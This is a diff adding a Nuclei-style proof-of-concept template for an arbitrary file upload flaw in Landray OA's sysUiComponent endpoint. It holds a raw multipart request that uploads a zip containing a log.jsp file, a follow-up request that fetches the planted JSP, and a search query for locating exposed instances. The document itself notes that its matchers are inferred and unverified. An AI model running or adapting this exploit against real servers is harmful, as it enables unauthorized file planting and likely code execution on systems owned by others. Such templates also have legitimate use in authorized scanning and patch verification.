@@ -1,0 +1,50 @@
+id: poc-8b8f4cfcd76fb0ccaf12
+info:
+  name: 蓝凌OAEKPsysUiComponent存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8b8f4cfcd76fb0ccaf1202c51252c02e
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 8b8f4cfcd76fb0ccaf1202c51252c02e
+    fofa: + hunter`app.name="Landray 蓝凌OA"`
+http:
+- raw:
+  - "POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo HTTP/2\nHost: {{Hostname}}\nCookie: SESSION=M2Y0ZjZjODItYzE2Ny00MzUxLThmMmMtNTIxZTJkNWI3NDEx\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------26002458101919536751996714568\nContent-Length: 556\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\n-----------------------------26002458101919536751996714568\nContent-Disposition: form-data; name=\"file\"; filename=\"output.zip\"\nContent-Type: application/zip\n\nPK\x03\x04\x14\0\0\0\0�\x03�W\nU��\x16\0\0\0\x14\0\0\0\n\0\0\0component.ini�L�5202��K�M���O��*.\0\0PK\x03\x04\x14\0\0\0\0�\x03�W��g~_\0\0\0g\0\0\0\a\0\0\0log.jsp\n�1\x0E�0\nF᫰ �\n,e\x06u�\\�\t,��\x1AYI\x1A\n\\\x1F�����m�7�R5��\x10c|\\Q�p4��\x9A��� ��N�\x13��\x01bo�o��mX��\x11u7����?�\x0E���y\x02PK\x01\x02\x14\x03\x14\0\0\0\0�\x03�W\nU��\x16\0\0\0\x14\0\0\0\n\0\0\0\0\0\0\0\0\0\0\0�\x01\0\0\0\0component.iniPK\x01\x02\x14\x03\x14\0\0\0\0�\x03�W��g~_\0\0\0g\0\0\0\a\0\0\0\0\0\0\0\0\0\0\0�\x01A\0\0\0log.jspPK\x05\x06\0\0\0\0\x02\0\x02\0p\0\0\0�\0\0\0\0\0\n-----------------------------26002458101919536751996714568--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /resource/ui-component/2023/log.jsp HTTP/2
+
+    Host: {{Hostname}}
+
+    Cookie: SESSION=M2Y0ZjZjODItYzE2Ny00MzUxLThmMmMtNTIxZTJkNWI3NDEx
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Site: same-origin
+
+    Te: trailers'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
